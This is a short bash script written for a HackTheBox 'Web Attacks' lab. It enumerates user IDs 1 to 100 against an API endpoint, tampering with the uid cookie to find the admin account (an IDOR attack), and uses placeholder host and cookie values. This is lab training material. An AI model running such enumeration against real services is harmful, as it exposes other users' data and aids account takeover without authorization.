#!/bin/bash

# For HacktheBox Web Attacks skills assessment. Find admin uid. Burp Suite may be easier but skripting is more fun! 
# Add ip
url="http://ip:port" 
#Add cookie
for i in {1..100}; do
	request=$(curl -s -X GET "$url/api.php/user/$i" -H "Cookie: PHPSESSID=<add_your_cookie>; uid=$i") 
	uid=$(echo "$request" | jq -r '.uid')
	username=$(echo "$request" | jq -r '.username')
	full_name=$(echo "$request" | jq -r '.full_name')
	company=$(echo "$request" | jq -r '.company')
	# Check for admin in request
	if echo "$request" | grep -iq 'admin'; then
        	echo "Admin found: UID: $uid, Username: $username, Fullname: $full_name, Company: $company"
        	exit 0
	fi
done
